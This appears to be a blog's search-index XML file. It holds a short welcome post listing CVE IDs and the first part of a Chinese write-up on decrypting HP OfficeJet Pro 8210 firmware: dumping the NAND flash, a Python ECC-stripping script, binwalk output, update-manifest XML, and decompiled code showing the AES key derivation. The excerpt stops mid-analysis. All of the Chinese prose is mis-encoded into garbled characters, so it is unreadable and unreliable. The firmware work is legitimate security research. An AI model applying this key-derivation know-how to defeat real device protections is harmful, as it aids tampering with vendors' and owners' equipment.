<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>æ¬¢è¿ï¼</title>
    <url>/2019/09/01/hello-world/</url>
    <content><![CDATA[<p>å¦‚æœæ‚¨åœ¨æ–‡ç« ä¸­å‘ç°äº†ä»»ä½•é—®é¢˜ï¼Œæˆ–æœ‰æ„è§å’Œå»ºè®®ï¼Œæ¬¢è¿é€šè¿‡ç”µå­é‚®ä»¶ä¸æˆ‘è”ç³»ã€‚</p>
<span id="more"></span>

<h2 id="CVE-ID-assigned"><a href="#CVE-ID-assigned" class="headerlink" title="CVE ID assigned"></a>CVE ID assigned</h2><p>CVE-2022-22274 | CVE-2022-22280 | CVE-2022-33869 | CVE-2023-20126 | CVE-2023-23368 | CVE-2023-28962 | CVE-2023-28963 | CVE-2023-31447 | CVE-2023-36636 | CVE-2023-45590 | CVE-2024-23721 | CVE-2024-39565 | CVE-2024-12803 | CVE-2024-12805 | CVE-2024-12806 | CVE-2024-53695</p>
]]></content>
  </entry>
  <entry>
    <title>HP æ‰“å°æœºå›ºä»¶è§£å¯†åˆ†æ</title>
    <url>/2025/08/06/hp_firmware_dec/</url>
    <content><![CDATA[<p>æœ¬æ–‡ä»‹ç»ä½œè€…åœ¨ç ”ç©¶ HP æŸå‹å·æ‰“å°æœºæ—¶é‡åˆ°çš„å›ºä»¶åŠ å¯†é—®é¢˜ï¼Œå¹¶åœ¨åˆ†æå›ºä»¶åŠ å¯†æ–¹æ¡ˆåç¼–å†™äº†ä¸€ç»„å·¥å…·å¯ä»¥ç”¨äºè§£å¯†æ­¤ç±»å›ºä»¶ã€‚</p>
<span id="more"></span>

<h1 id="ç›®æ ‡ç®€ä»‹"><a href="#ç›®æ ‡ç®€ä»‹" class="headerlink" title="ç›®æ ‡ç®€ä»‹"></a>ç›®æ ‡ç®€ä»‹</h1><p>HP å…¬å¸åœ¨å…¨çƒæ‰“å°æœºå¸‚åœºå æ®é‡è¦ä»½é¢ï¼Œæ˜¯â€æ‰“å°ç‹å›½â€çš„é¢†å¤´ç¾Šã€‚è¿‘å¹´æ¥éšç€å…¨çƒç½‘ç»œå®‰å…¨å½¢åŠ¿æ—¥ç›Šå¤æ‚ï¼Œç±»ä¼¼æ‰“å°æœºç­‰æ™ºèƒ½è®¾å¤‡å¼€å§‹è¿›å…¥æ¶æ„æ”»å‡»è€…çš„è§†çº¿ã€‚åŒæ—¶åœ¨å…¨çƒçŸ¥åé»‘å®¢æ¯”èµ› Pwn2Own ä¸­ï¼ŒHP æ‰“å°æœºä½œä¸ºæ¯”èµ›é¡¹ç›®ä¹Ÿæ—¶æœ‰ç™»åœºã€‚</p>
<p>åœ¨æ‰“å°æœºå¸‚åœºä¸­ï¼Œåˆ©æ¶¦ç‡æœ€é«˜çš„é€šå¸¸å¹¶ä¸æ˜¯æ‰“å°æœºç¡¬ä»¶ï¼Œè€Œæ˜¯å„ç±»è€—æã€‚å› æ­¤å¸‚é¢ä¸Šæœ‰å¾ˆå¤šäººå°è¯•ä½¿ç”¨ç¬¬ä¸‰æ–¹è€—ææ¥é™ä½æˆæœ¬ï¼Œè€Œä½¿ç”¨æ­¤ç±»è€—æå°±éœ€è¦ç»•è¿‡æ‰“å°æœºç³»ç»Ÿä¸­çš„æœ‰å…³é™åˆ¶ã€‚å‚å•†ä¸ºäº†èƒ½å¤Ÿå”®å‡ºæ›´å¤šå®˜æ–¹è€—æï¼Œæ¯æ¬¡æ›´æ–°ä¹Ÿä¼šå‘ç³»ç»Ÿä¸­æ·»åŠ æ›´å¤šé™åˆ¶å’Œæ£€æŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸æ–­æ¼”è¿›çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥æ‰“å°æœºå‚å•†ä¸€èˆ¬ä¼šé€‰æ‹©åº”ç”¨å›ºä»¶åŠ å¯†ç­‰å¤šç§å®‰å…¨æ‰‹æ®µï¼Œæ¥å¢åŠ é€†å‘ç ´è§£æ‰“å°æœºçš„éš¾åº¦ã€‚</p>
<p>æŒ‰æ“ä½œç³»ç»Ÿæ¥è¯´ï¼ŒHP æ‰“å°æœºä¸»è¦æœ‰åŸºäº Linux ä»¥åŠ RTOS ä¸¤ç§ï¼Œæ— è®ºå“ªç§ç³»ç»Ÿï¼Œå…¶å›ºä»¶åŠ å¯†æ–¹å¼åº”è¯¥æ˜¯ç±»ä¼¼çš„ï¼Œæœ¬æ¬¡ç ”ç©¶ï¼Œæˆ‘é€‰æ‹© HP OfficeJet Pro 8210 ä½œä¸ºç›®æ ‡ã€‚OfficeJet Pro 8210 æ˜¯ä¸€æ¬¾å‘å¸ƒæ—¶é—´è¾ƒæ—©çš„æ‰“å°æœºï¼Œå®ƒä½¿ç”¨äº† Linux ä½œä¸ºåº•å±‚æ“ä½œç³»ç»Ÿï¼ŒæŸç§ç¨‹åº¦ä¸Šä¼šæ¯” RTOS æ›´æ–¹ä¾¿åˆ†æã€‚</p>
<h1 id="æå–å›ºä»¶"><a href="#æå–å›ºä»¶" class="headerlink" title="æå–å›ºä»¶"></a>æå–å›ºä»¶</h1><p>è¿‘å¹´æ¥æ›¾åœ¨ Pwn2Own ä¸ŠæˆåŠŸç ´è§£ HP æ‰“å°æœºçš„å›¢é˜Ÿå¦‚ DEVCOREã€neodyme ç­‰éƒ½å‘å¸ƒè¿‡ç›¸å…³æ¼æ´åˆ†ææ–‡ç« ï¼Œä½†ä¼¼ä¹å¹¶æ²¡æœ‰è¯¦ç»†æè¿°å›ºä»¶è§£å¯†æ–¹æ³•ï¼Œå…¶ä¸­ neodyme å›¢é˜Ÿåœ¨ä»–ä»¬çš„<a class="link"   href="https://neodyme.io/en/blog/pwn2own-2022_printer_rce/#firmware-decryption" >æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä¸­æåˆ°äº†éƒ¨åˆ†å›ºä»¶åŠ å¯†ç­–ç•¥ï¼Œä½†æ²¡æœ‰å‘å¸ƒè§£å¯†å·¥å…·ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.A static XOR-â€encryptedâ€ key</span><br><span class="line">2.The HP internal firmware project name</span><br><span class="line">3.The checksum of the decompressed firmware blob</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºæ²¡æœ‰å…¬å¼€çš„å›ºä»¶è§£å¯†æ–¹æ³•ï¼Œå¹¶ä¸”æš‚æ—¶ä¹Ÿæ— æ³•è·å–è®¾å¤‡çš„ Shell æƒé™ï¼Œæˆ‘ä»¬è€ƒè™‘ç›´æ¥ä»è®¾å¤‡ Flash èŠ¯ç‰‡ä¸­è¯»å–å›ºä»¶å†…å®¹ã€‚å°†æ‰“å°æœºæ‹†æœºåå–å‡ºä¸»æ¿ï¼Œåœ¨ä¸»æ¿èƒŒé¢å¯ä»¥æ‰¾åˆ°ä¸€é¢—å‹å·ä¸º 29f2g08abaea çš„ NAND Flash èŠ¯ç‰‡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º(çº¢è‰²æ–¹æ¡†)ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hp_firmware_dec1.png"
                     
                ></p>
<p>å°† Flash èŠ¯ç‰‡ç”¨çƒ­é£æªæ‹†ä¸‹ï¼Œç¦»çº¿ä½¿ç”¨ç¼–ç¨‹å™¨è¯»å–å†…å®¹ï¼Œç”±äº NAND èŠ¯ç‰‡çš„ç‰¹æ€§ï¼Œéœ€è¦åœ¨æœ¬åœ°å°†æ•°æ®ä¸­çš„ ECC ç­‰æ ¡éªŒæ•°æ®å»é™¤ã€‚</p>
<p>æŸ¥è¯¢èŠ¯ç‰‡æ‰‹å†Œå‘ç°ï¼Œè¯¥èŠ¯ç‰‡é‡‡ç”¨ Data area + Spare area å½¢å¼ç»„ç»‡æ•°æ®ï¼Œæ¯ä¸ª page 2112 å­—èŠ‚ï¼Œå‰é¢ 2048 å­—èŠ‚ä¸ºç”¨æˆ·æ•°æ®ï¼Œåé¢ 64 å­—èŠ‚ä¸º ECC æ•°æ®ï¼Œæ¯ä¸ª Block ç”± 64 ä¸ª Page ç»„æˆï¼Œåå—æ ‡è®° 0x00ã€‚æ ¹æ®æ‰‹å†Œä¸­çš„ä¿¡æ¯ï¼Œå¯ä»¥ç¼–å†™è„šæœ¬æ¥å¤„ç†åŸå§‹æ•°æ®ï¼Œæ¸…é™¤ ECC æ ¡éªŒå†…å®¹ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">input_file_path, output_file_path</span>):</span><br><span class="line">    chunk_size = <span class="number">2112</span></span><br><span class="line">    bytes_to_write = <span class="number">2048</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> input_file, <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># Read a chunk of data</span></span><br><span class="line">                data = input_file.read(chunk_size)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># If less than 2112 bytes are read, it means end of file</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Write only the first 2048 bytes to the output file</span></span><br><span class="line">                output_file.write(data[:bytes_to_write])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage</span></span><br><span class="line">input_file_path = <span class="string">&#x27;READ1.BIN&#x27;</span></span><br><span class="line">output_file_path = <span class="string">&#x27;OUTPUT.BIN&#x27;</span></span><br><span class="line">process_file(input_file_path, output_file_path)</span><br></pre></td></tr></table></figure></div>

<p>å¯¹å¤„ç†åçš„æ–‡ä»¶è¿›è¡Œ binwalkï¼Œç»“æœä¸ºï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">133120        0x20800         PC bitmap, Windows 3.x format,, 480 x 272 x 24</span><br><span class="line">777188        0xBDBE4         Zlib compressed data, best compression</span><br><span class="line">777224        0xBDC08         Zlib compressed data, best compression</span><br><span class="line">777260        0xBDC2C         Zlib compressed data, best compression</span><br><span class="line">777296        0xBDC50         Zlib compressed data, best compression</span><br><span class="line">777332        0xBDC74         Zlib compressed data, best compression</span><br><span class="line">777368        0xBDC98         Zlib compressed data, best compression</span><br><span class="line">777400        0xBDCB8         Zlib compressed data, best compression</span><br><span class="line">777452        0xBDCEC         Zlib compressed data, best compression</span><br><span class="line">777488        0xBDD10         Zlib compressed data, best compression</span><br><span class="line">778040        0xBDF38         Zlib compressed data, best compression</span><br><span class="line">778548        0xBE134         Zlib compressed data, best compression</span><br><span class="line">781700        0xBED84         Zlib compressed data, best compression</span><br><span class="line">781812        0xBEDF4         Zlib compressed data, best compression</span><br><span class="line">782452        0xBF074         Zlib compressed data, best compression</span><br><span class="line">782552        0xBF0D8         Zlib compressed data, best compression</span><br><span class="line">787668        0xC04D4         Zlib compressed data, best compression</span><br><span class="line">792384        0xC1740         Zlib compressed data, best compression</span><br><span class="line">793424        0xC1B50         Zlib compressed data, best compression</span><br><span class="line">794692        0xC2044         Zlib compressed data, best compression</span><br><span class="line">796292        0xC2684         Zlib compressed data, best compression</span><br><span class="line">796376        0xC26D8         Zlib compressed data, best compression</span><br><span class="line">797912        0xC2CD8         Zlib compressed data, best compression</span><br><span class="line">802320        0xC3E10         Zlib compressed data, best compression</span><br><span class="line">802920        0xC4068         Zlib compressed data, best compression</span><br><span class="line">803168        0xC4160         Zlib compressed data, best compression</span><br><span class="line">803320        0xC41F8         Zlib compressed data, best compression</span><br><span class="line">805900        0xC4C0C         Zlib compressed data, best compression</span><br><span class="line">806484        0xC4E54         Zlib compressed data, best compression</span><br><span class="line">811676        0xC629C         Zlib compressed data, best compression</span><br><span class="line">811793        0xC6311         Zlib compressed data, best compression</span><br><span class="line">812456        0xC65A8         Zlib compressed data, best compression</span><br><span class="line">813092        0xC6824         Zlib compressed data, best compression</span><br><span class="line">814160        0xC6C50         Zlib compressed data, best compression</span><br><span class="line">817516        0xC796C         Zlib compressed data, best compression</span><br><span class="line">822232        0xC8BD8         Zlib compressed data, best compression</span><br><span class="line">822932        0xC8E94         Zlib compressed data, best compression</span><br><span class="line">823988        0xC92B4         Zlib compressed data, best compression</span><br><span class="line">824100        0xC9324         Zlib compressed data, best compression</span><br><span class="line">825260        0xC97AC         Zlib compressed data, best compression</span><br><span class="line">825772        0xC99AC         Zlib compressed data, best compression</span><br><span class="line">825876        0xC9A14         Zlib compressed data, best compression</span><br><span class="line">826408        0xC9C28         Zlib compressed data, best compression</span><br><span class="line">4030464       0x3D8000        Linux kernel ARM boot executable zImage (little-endian)</span><br><span class="line">4048440       0x3DC638        gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)</span><br><span class="line">7483392       0x723000        Flattened device tree, size: 11781 bytes, version: 17</span><br><span class="line">23461888      0x1660000       UBI erase count header, version: 1, EC: 0x1, VID header offset: 0x800, data offset: 0x1000</span><br><span class="line">261621760     0xF980800       PC bitmap, Windows 3.x format,, 480 x 272 x 24</span><br><span class="line">262772736     0xFA99800       Linux kernel ARM boot executable zImage (little-endian)</span><br><span class="line">262790712     0xFA9DE38       gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)</span><br><span class="line">266225664     0xFDE4800       Flattened device tree, size: 11802 bytes, version: 17</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±æ‹¿åˆ°äº†æœªåŠ å¯†çš„å›ºä»¶æ•°æ®ã€‚</p>
<h1 id="è§£å¯†åˆ†æ"><a href="#è§£å¯†åˆ†æ" class="headerlink" title="è§£å¯†åˆ†æ"></a>è§£å¯†åˆ†æ</h1><p>ä» binwalk ç»“æœæ¥çœ‹ï¼Œè¯¥è®¾å¤‡ä½¿ç”¨çš„æ˜¯ ARM æ¶æ„ CPU å’Œ Linux ç³»ç»Ÿï¼ŒåŒæ—¶ä½¿ç”¨ UBI ä½œä¸ºæ–‡ä»¶ç³»ç»Ÿã€‚å°†å›ºä»¶ä¸­ UBI çš„éƒ¨åˆ†æå–å‡ºæ¥ï¼Œä½¿ç”¨ UBI Reader è§£å‹ã€‚</p>
<p>è§£å‹åå¾—åˆ°ä¸€ä¸ªæ ‡å‡†çš„ Linux æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œä¸‹ä¸€æ­¥è¦ç¡®å®šæ˜¯å“ªä¸ªç¨‹åºè´Ÿè´£æ‰§è¡Œå›ºä»¶å‡çº§æ“ä½œã€‚æˆ‘ä»¬å…ˆä» HP å®˜æ–¹ç½‘ç«™ä¸‹è½½ OfficeJet Pro 8210 çš„å‡çº§åŒ…ï¼Œå°è¯•é€šè¿‡å‡çº§åŒ…ä¸­çš„ä¿¡æ¯æ¥å®šä½å‡çº§ç¨‹åºã€‚</p>
<p>ä¸‹è½½åˆ°çš„å‡çº§åŒ…ä¸º exe æ ¼å¼ï¼Œå¯ä»¥ä»ä¸­è§£å‹å‡º .ful2 æ ¼å¼çš„æ›´æ–°æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶åŸºæœ¬æ˜¯ä¸€ä¸ª PJL æ ¼å¼çš„æè¿°æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“åœ¨æœ¬åœ°æ‰§è¡Œå‡çº§ç¨‹åºæ—¶ï¼Œä¼šå°†è¿™ä¸ªæ›´æ–°æ–‡ä»¶å‘é€åˆ°æ‰“å°æœº PJL æœåŠ¡ä¸­ï¼Œç”± PJL æ‰§è¡Œå‡çº§åŠ¨ä½œã€‚</p>
<p>ä» PJL å‘½ä»¤ä¸­èƒ½å¤Ÿå®šä½åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PJL COMMENT MODEL=HP OfficeJet Pro 8210</span><br><span class="line">@PJL COMMENT VERSION=TESPDLPP1N001.2514A.00</span><br><span class="line">@PJL COMMENT DATECODE=20250403</span><br><span class="line">@PJL UPGRADE SIZE=64534679</span><br><span class="line">@PJL ENTER LANGUAGE=FWUPDATE2</span><br></pre></td></tr></table></figure></div>

<p>ä»ä¸Šè¿°ä¿¡æ¯å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‡çº§åŒ…ç”¨äº HP OfficeJet Pro 8210 è®¾å¤‡ï¼Œå®ƒçš„ç‰ˆæœ¬æ˜¯ 2514Aï¼Œå‡çº§åŒ…å¤§å°ä¸º 64534679ï¼ŒPJL å†…éƒ¨éœ€è¦è°ƒç”¨ FWUPDATE2 å‘½ä»¤æ¥å¤„ç†åç»­æ•°æ®ã€‚</p>
<p>åœ¨è§£å‹å‡ºçš„æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢ FWUPDATE2 å­—ç¬¦ä¸²ï¼Œèƒ½å¤Ÿå®šä½åˆ° plang ç¨‹åºï¼Œç®€å•é€†å‘åå‘ç°å®ƒåªæ˜¯ä¸€ä¸ª PJL è§£ææœåŠ¡ï¼Œä¸åŒ…å«å’Œå›ºä»¶è§£å¯†&#x2F;å‡çº§æœ‰å…³çš„æ“ä½œã€‚</p>
<p>ç»§ç»­åˆ†æå‡çº§åŒ…å†…å®¹ï¼Œå…¶ä¸­è¿˜åŒ…å«ä¸€æ®µ XML æ ¼å¼çš„æ•°æ®</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">&#x27;webfwupdate.xsd&#x27;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&#x27;http://www.w3.org/2001/XMLSchema-instance&#x27;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">signature</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">signature_template_id</span>&gt;</span>49be5195-1daa-474a-a957-1aa4ae38d9b1<span class="tag">&lt;/<span class="name">signature_template_id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">public_key_id</span>&gt;</span>bdfcc564-a078-4112-a089-179e73831f27<span class="tag">&lt;/<span class="name">public_key_id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">signature_value</span>&gt;</span>AgIAAAFrABQBADp+CGMl0KV41veITeohrqqhhpjUIN8AUS5suiRA4lQ8bt7g7U6gBo8B7roClXh8V3rDBfUdki+BkMXMcMVuKJLeThLxSuq09d0NrZxcbpgAe/VON/rD0JGSFGWUDHoJOqyTNipxgDzUxwnGBf/bC5IYIUsDo8Y24jZ0ItuVL3ZUBoQVUuyrskc3pMQXyWO3inuUGYezvppaiMxTwzeKujpqSMt7bp6quPXVXuapc26GXvtbZKgCQMjhJi2mImoWu5uAbb8ll/z57wWV9zmF0vhGBFts4l3dwBzEyRnjQ3NSGhJG6/cHskiUYwM77ADnIpWNKu1+9JzVfZKqw8XFFe8=<span class="tag">&lt;/<span class="name">signature_value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">digest</span>&gt;</span>E3p+JOq7kzU0lzf141hIpQypfz9Dlm6RhxSEiQN9mdc=<span class="tag">&lt;/<span class="name">digest</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">signature</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">signedInfo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">update_type</span>&gt;</span>optional<span class="tag">&lt;/<span class="name">update_type</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">current_revision</span>&gt;</span>ANY<span class="tag">&lt;/<span class="name">current_revision</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">updated_revision</span>&gt;</span>TESPDLPP1N001.2514A.00<span class="tag">&lt;/<span class="name">updated_revision</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">LBI_blob</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">blob_path</span>&gt;</span>TESPDLPP1N001.2514A.00/lbi_blob.TESPDLPP1N001.2514A.00_from_ANY<span class="tag">&lt;/<span class="name">blob_path</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">size_compressed</span>&gt;</span>6555032<span class="tag">&lt;/<span class="name">size_compressed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">size_uncompressed</span>&gt;</span>7406784<span class="tag">&lt;/<span class="name">size_uncompressed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">blob_digest_compressed</span>&gt;</span>Mh5oeVTudC4g/nbC312B8jpmvWlzLg/SxOwtfmXTN9I=<span class="tag">&lt;/<span class="name">blob_digest_compressed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">blob_digest_uncompressed</span>&gt;</span>JbxisevJymAZhQ8qfCJNJ10V7jDbllnsHgaPmuRfRKo=<span class="tag">&lt;/<span class="name">blob_digest_uncompressed</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">LBI_blob</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">rootfs_blob</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">blob_path</span>&gt;</span>TESPDLPP1N001.2514A.00/rootfs.TESPDLPP1N001.2514A.00_from_ANY<span class="tag">&lt;/<span class="name">blob_path</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">size_compressed</span>&gt;</span>57977683<span class="tag">&lt;/<span class="name">size_compressed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">size_uncompressed</span>&gt;</span>77463552<span class="tag">&lt;/<span class="name">size_uncompressed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">blob_digest_compressed</span>&gt;</span>wlOQbDzmdmHyTKgnzvzZ9L0xr7+sWTS775Ku0fF3R8Q=<span class="tag">&lt;/<span class="name">blob_digest_compressed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">blob_digest_uncompressed</span>&gt;</span>Ny6XZGGWxpzhg7gQLquITQ7TBEh/CR0FVLeCOMquNcU=<span class="tag">&lt;/<span class="name">blob_digest_uncompressed</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">rootfs_blob</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">signedInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µæ•°æ®åŒ…å«å‡çº§åŒ…çš„ç‰ˆæœ¬ã€æ ¡éªŒå’Œç­‰ä¿¡æ¯ï¼Œé‚£ä¹ˆç³»ç»Ÿåœ¨æ‰§è¡Œå‡çº§æ“ä½œæ—¶è‚¯å®šä¼šå¯¹è¿™æ®µæ•°æ®è¿›è¡Œè§£æï¼Œæ‰€ä»¥å°è¯•æœç´¢å…¶ä¸­çš„ xml æ ‡ç­¾åï¼Œä¾‹å¦‚ <code>signature_template_id</code>ï¼Œæœ€ç»ˆå®šä½åˆ° fwupd ç¨‹åºï¼Œæ ¹æ®æ–‡ä»¶åä¹Ÿå¤§è‡´èƒ½ç¡®å®šè¿™ä¸ªç¨‹åºå’Œå›ºä»¶å‡çº§æœ‰å…³ã€‚</p>
<p>é€†å‘åˆ†ææ­¤ç¨‹åºï¼Œæœç´¢ xml æ ‡ç­¾åå®šä½åˆ°å‡½æ•° Aï¼Œæˆ‘å°†ä¹‹å‘½åä¸º <code>do_parse_firmware_xml</code>ï¼Œè¿™ä¸ªå‡½æ•°é¦–å…ˆè§£æä¸Šé¢è¿™æ®µ xml æ•°æ®ï¼Œå¯ä»¥ç§°ä¹‹ä¸ºå…ƒæ•°æ®ï¼Œå‡½æ•°å°†è§£æå¾—åˆ°çš„å„ä¸ªéƒ¨åˆ†ä¿å­˜åˆ° <code>/sirius/rw/var/lib/fwupd/fwupd_manifest.sig</code> æ–‡ä»¶ä¸­ã€‚ç„¶åè®¡ç®—è¿™æ®µ xml æ•°æ®çš„ SHA256 å€¼ï¼Œå’Œå…¶ä¸­çš„ digest è¿›è¡Œæ¯”è¾ƒï¼Œé€šè¿‡ä¹‹åç¨‹åºå°† <code>fwupd_manifest.sig</code> æ–‡ä»¶ä½œä¸ºå‚æ•°è°ƒç”¨<code>send_to_check_sig</code> å‡½æ•°ï¼Œè¿›è¡Œç­¾åéªŒè¯æ“ä½œã€‚</p>
<p>ä»¥ä¸Šåˆæ­¥éªŒè¯é€šè¿‡åï¼Œç¨‹åºè¿˜ä¼šå¯¹ç‰ˆæœ¬åšä¸€å®šçš„æ£€æŸ¥ï¼Œè¿™å¯èƒ½æ˜¯ä¸ºäº†é˜²æ­¢å›ºä»¶é™çº§ï¼Œä½†ç”±äºå¤§éƒ¨åˆ†å›ºä»¶è¿™ä¸ªå­—æ®µéƒ½æ˜¯ ANYï¼Œæ‰€ä»¥å¯ä»¥å¿½ç•¥è¿™ä¸ªæ£€æŸ¥ã€‚</p>
<p>åœ¨å®Œæˆä¸Šé¢çš„åˆ†æä¹‹åï¼Œåç»­ç¨‹åºå¦‚ä½•å¯¹å›ºä»¶è¿›è¡Œè§£å¯†å°±æ— æ³•ç›´æ¥å®šä½äº†ï¼Œå› ä¸ºç¨‹åºé‡‡ç”¨ C++ ç¼–å†™ï¼ŒåŒ…å«å¤§é‡è™šå‡½æ•°å’Œé—´æ¥è°ƒç”¨ï¼Œéš¾ä»¥ç›´æ¥é€šè¿‡å‡½æ•°å¼•ç”¨å®šä½å…³é”®é€»è¾‘ã€‚è¿™æ—¶æƒ³èµ· neodyme æ–‡ç« ä¸­æåŠï¼Œå›ºä»¶æ˜¯é‡‡ç”¨ AES ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥åœ¨ç¨‹åºä¸­æœç´¢å’Œ AES ç›¸å…³çš„ API åç§°ï¼Œæ‰¾åˆ°äº† <code>gen_aes_key</code> å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">gen_aes_key</span><span class="params">(aes_object *aes_object, <span class="type">char</span> *part4, <span class="type">int</span> is_any)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(part1, <span class="string">&quot;@* WebFWUpdate&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  result = SHA256_Init(v15);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    get_unknown_part(&amp;part2);</span><br><span class="line">    get_unknown_part2(&amp;part3);</span><br><span class="line">    SHA256_Update(v15, part1, <span class="number">14</span>);</span><br><span class="line">    SHA256_Update(v15, part2, *(part2 - <span class="number">12</span>));</span><br><span class="line">    <span class="keyword">if</span> ( !is_any )</span><br><span class="line">      SHA256_Update(v15, part3, *(part3 - <span class="number">12</span>));</span><br><span class="line">    SHA256_Update(v15, part4, <span class="number">32</span>);</span><br><span class="line">    SHA256_Final(v14, v15);</span><br><span class="line">    AES_set_decrypt_key(v14, <span class="number">128</span>, aes_object-&gt;KEY);</span><br><span class="line">    <span class="comment">//. ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µä»£ç è°ƒç”¨äº† <code>AES_set_decrypt_key</code> å‡½æ•°æ¥è®¾ç½® AES å¯†é’¥ï¼Œä¹Ÿæ˜¯ fwupd ç¨‹åºä¸­å”¯ä¸€ä¸€å¤„è®¾ç½®å¯†é’¥çš„ä½ç½®ã€‚åˆ†æå‡½æ•°é€»è¾‘ï¼ŒAES å¯†é’¥åº”è¯¥æ˜¯ <code>SHA256(&quot;@* WebFWUpdate&quot; + part2 + part3 + part4)</code> å–ç»“æœçš„å‰ 16 å­—èŠ‚ã€‚</p>
<p>part2 æ˜¯åœ¨ <code>get_unknown_part</code> å‡½æ•°ä¸­èµ‹å€¼çš„ï¼š</p>
